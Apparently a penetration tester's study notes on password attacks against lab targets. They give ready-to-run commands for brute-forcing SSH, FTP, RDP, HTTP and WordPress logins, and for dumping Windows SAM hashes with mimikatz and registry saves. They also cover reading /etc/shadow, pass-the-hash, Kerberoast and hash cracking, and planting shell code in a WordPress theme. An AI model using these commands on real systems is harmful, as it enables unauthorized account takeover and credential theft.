# Password Attacks

## Table of Contents
- [Wordlists](#wordlists)
- [Brute Force Wordlists](#brute-force-wordlists)
- [Common Network Service Attack Methods](#common-network-service-attack-methods)
    - [HTTP htaccess Attack with Medusa](#http-htaccess-attack-with-medusa)
    - [Remote Desktop Protocol Attack with Crowbar](#remote-desktop-protocol-attack-with-crowbar)
    - [SSH Attack with THC-Hydra](#ssh-attack-with-thc-hydra)
    - [FTP Attack with THC-Hydra](#ftp-attack-with-thc-hydra)
    - [HTTP GET Attack with THC-Hydra](#http-get-attack-with-thc-hydra)
    - [HTTP POST Attack with THC-Hydra](#http-post-attack-with-thc-hydra)
    - [HTTP POST Attack with WPScan](#http-post-attack-with-wpscan)
    - [Crack ZIP/RAR Password Using John](#crack-ziprar-password-using-john)
- [Leveraging Password Hashes](#leveraging-password-hashes)
    - [Retrieving Password Hashes](#retrieving-password-hashes)
    - [Dumping Hashes from SAM via Registry](#dumping-hashes-from-sam-via-registry)
    - [Passing the Hash in Windows](#passing-the-hash-in-windows)
    - [Cracking TGS](#cracking-tgs)
    - [Password Cracking](#password-cracking)
        - [Cracking NT hashes](#cracking-nt-hashes)
        - [Cracking Linux-based hashes](#cracking-linux-based-hashes)

## Wordlists
Creating a dictionary file using [cewl](http://www.digininja.org/projects/cewl.php):
```sh
kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
# scrapes the www.megacorpone.com web site, locates words with a minimum of six characters (-m 6), 
# and writes (-w) the wordlist to a custom file (megacorp-cewl.txt):
```
[John the Ripper (JTR)](http://www.openwall.com/john/), which is a fast password cracker with several features including the ability to generate custom wordlists and apply rule permutations.

1. We can add a rule to the JTR configuration file (**`/etc/john/john.conf`**) that will mutate our wordlist. To do this, we must locate the `[List.Rules:Wordlist]` segment where wordlist mutation rules are defined, and append a new rule.
    ```sh
    kali@kali:~$ sudo nano /etc/john/john.conf
    ...
    # Wordlist mode rules
    [List.Rules:Wordlist]
    # Try words as they are
    :
    ...
    # Add two numbers to the end of each password
    $[0-9]$[0-9]
    ...
    ```
2. Mutating passwords using John the Ripper. Specify the dictionary file (`--wordlist=megacorp-cewl.txt`), activate the rules in the configuration file (`--rules`), output the results to standard output (`--stdout`), and redirect that output to a file called `mutated.txt`:
    ```sh
    kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
    Press 'q' or Ctrl-C to abort, almost any other key for status
    46446p  0:00:00:00 100.00% (2018-03-01 15:41) 663514p/s chocolate99
    ```


## Brute Force Wordlists
[Crunch](https://sourceforge.net/projects/crunch-wordlist/) is a powerful wordlist generator included in kali linux.
![image](https://user-images.githubusercontent.com/48137513/198032830-c6e42d1d-ca4e-4578-a30b-0abf83cc9399.png)
To generate a wordlist that matches our requirements, we will specify a minimum and maximum word length of eight characters (8 8) and describe our rule pattern with `-t ,@@^^%%%`:
```sh
kali@kali:~$ crunch 8 8 -t ,@@^^%%%
```
## Common Network Service Attack Methods
### HTTP htaccess Attack with Medusa

1. Decompressing the rockyou wordlist
    ```sh
    kali@kali:~$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
    ```
2. HTTP htaccess-protected web directory attack using Medusa
    ```sh
    kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
    ```
### Remote Desktop Protocol Attack with Crowbar
1. Using apt install to install crowbar
    ```sh
    kali@kali:~$ sudo apt install crowbar
    ```
2. RDP password attack using Crowbar
    ```sh
    kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
    ```
__Note__: We specified a single thread since the remote desktop protocol does not reliably handle multiple threads.
### SSH Attack with THC-Hydra
SSH attack using Hydra
```sh
kali@kali:~$ hydra -l <victim_usr> -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
```
**Note**: Use the **`-s`** option to change port if the service runs on a different port than default one.
### FTP Attack with THC-Hydra
```sh
kali@kali:~$ hydra -l <usr> -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 3 -f     
# -f will stop at first match
# -t 3 will keep workers/threads number smaller-equal-than 3
```
### HTTP GET Attack with THC-Hydra
```
kali@kali:~$ hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f -s 8080 $IP http-get /manager/html
```
### HTTP POST Attack with THC-Hydra
Get additional information about the http-form-post module
```sh
kali@kali:~$ hydra http-form-post -U
```
Attacking the web form with THC-Hydra
```sh
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=^USER^&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```
If the user is not fixed
```sh
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=^USER^&pass=^PASS^:F=Unknown user" -L users.txt -p fake_pwd -vV -f
```
If we check for a redirection to an admin page
```sh
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=^USER^&pass=^PASS^:S=302" -l admin -P <wordlist> -vV -f
```
### HTTP POST Attack with WPScan
Wpscan is a vulnerability scanning tool which scans for vulnerabilities in websites that run WordPress web engines. 
```sh
kali@kali:~$ wpscan --url <https://recon_site.com>
```
For a thorough scan, we will need to provide the URL of the target (`--url`) and configure the enumerate option (`--enumerate`) to include "All Plugins" (`ap`), "All Themes" (`at`), "Config backups" (`cb`), and "Db exports" (`dbe`).
```sh
kali@kali:~$ wpscan --url sandbox.local --enumerate ap,at,cb,dbe
```
WordPress password dictionary attack
```sh
kali@kali:~$ wpscan --url <https://recon_site.com> --passwords rockyou.txt --usernames offsec,student –-max-threads 1
```
REF: https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/

#### Log In to WordPress
- When logged in to WordPress you can go to "Appearance" > "Editor" > "Choose a site page template to edit".
- In this case the default TwentyTwelve theme is in use, we can edit the "404.php"/"archive.php" page to include our shell code.
- Once the page has been updated successfully we can go to it in our browser (http://TheSiteURL/wp-content/themes/twentytwelve/404.php)

- Ref: [Plugin to Payload: A Simple Wordpress attack excercise](https://www.linkedin.com/pulse/plugin-payload-simple-wordpress-attack-excercise-barry-malone)
### Crack ZIP/RAR Password Using John
Get the password hashes to be cracked:
```sh
kali@kali:~$ ./zip2john flag.zip > zip.hashes
kali@kali:~$ ./rar2john flag.rar > rar.hashes
```
Crack them using John as usual:
```sh
kali@kali:~$ john --wordlist=mutated.txt zip.hashes
kali@kali:~$ john --wordlist=mutated.txt rar.hashes
```
## Leveraging Password Hashes
Identification of password hashes can be done using:
- the Openwall website
- the `hashid` tool

### Retrieving Password Hashes
On Windows systems, hashed passwords are stored in the Security Accounts Manager (SAM). To deter offline SAM database password attacks Microsoft introduced the SYSKEY feature which partially encrypts the SAM file.

Windows NT-based operating systems, up to and including Windows 2003, store two different password hashes: 
- LAN Manager ([LM](https://en.wikipedia.org/wiki/LM_hash)), which is based on DES, and 
- NT LAN Manager ([NTLM](https://en.wikipedia.org/wiki/NTLM)), which uses MD4 hashing. 

From Windows Vista on, the operating system disables LM by default and uses NTLM, which, among other things, is case sensitive, supports all Unicode characters, and does not split the hash into smaller, weaker parts. However, NTLM hashes stored in the SAM database are still not salted.

We can use mimikatz to mount in-memory attacks designed to dump the SAM hashes.

Among other things, mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.

Since LSASS is a privileged process running under the SYSTEM user, we must launch mimikatz from an administrative command prompt. 
To extract password hashes, we must first execute two commands. 
1. `privilege::debug` to enable the SeDebugPrivilge access right required to tamper with another process. If this commands fails, mimikatz was most likely not executed with administrative privileges.
2. `token::elevate` to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required. 

```cmd
C:\> C:\Tools\password_attacks\mimikatz.exe
...
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...
```
Now we can use lsadump::sam to dump the contents of the SAM database:
```cmd
mimikatz # lsadump::sam
```

### Dumping Hashes from SAM via Registry
1. On the victim, dump the registry hives required for hash extraction:
    ```cmd
    reg save hklm\system system
    reg save hklm\sam sam
    ```
2. On Kali, once the files are dumped and exfiltrated, dump hashes with **samdump2** on kali:
    ```sh
    kali@kali:~$ samdump2 system sam 
    *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:9f288c9a9aee917e19d4b21928b98268:::
    low:1003:aad3b435b51404eeaad3b435b51404ee:4bdaf9484819a077562ebeefaed6ca75:::
    ```
Ref: [Dumping Hashes from SAM via Registry](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)

You can crack these following [cracking NT hashes](#cracking-nt-hashes) and then change user with Windows [Runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490994(v=technet.10)?redirectedfrom=MSDN) command:
```cmd
C:\> runas /profile /user:bob /password:BOBIS2C
```
    
### Passing the Hash in Windows
The Pass-the-Hash (PtH) technique allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. 
- This is possible because NTLM/LM password hashes are not salted and remain static between sessions. 
- Moreover, if we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well, as long as that target has an account with the same username and password.

```sh
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
### Cracking TGS
```sh
#Hashcat
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
kali@kali:~$ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
# John
kali@kali:~$ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
# tgsrepcrack
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
Ref: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#kerberoast
### Password Cracking
#### Cracking NT hashes
Brute force cracking using John the Ripper
```sh
kali@kali:~$ sudo john hash.txt --format=NT
```
Dictionary cracking using John the Ripper
```sh
kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
Cracking using password mutation rules
```sh
kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
#### Cracking Linux-based hashes
Crack it using john:
```sh
kali@kali:~$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

TODO(Check why all this unshadowing is needed??)

In order to crack Linux-based hashes with JTR, we will need to first use the unshadow utility to combine the passwd and shadow files from the compromised system. 
```sh
kali@kali:~$ grep victim /etc/passwd > passwd-file.txt
kali@kali:~$ grep victim /etc/shadow > shadow-file.txt

kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrBBNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash

kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
```
Cracking a Linux password hash using John the Ripper
```sh
kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
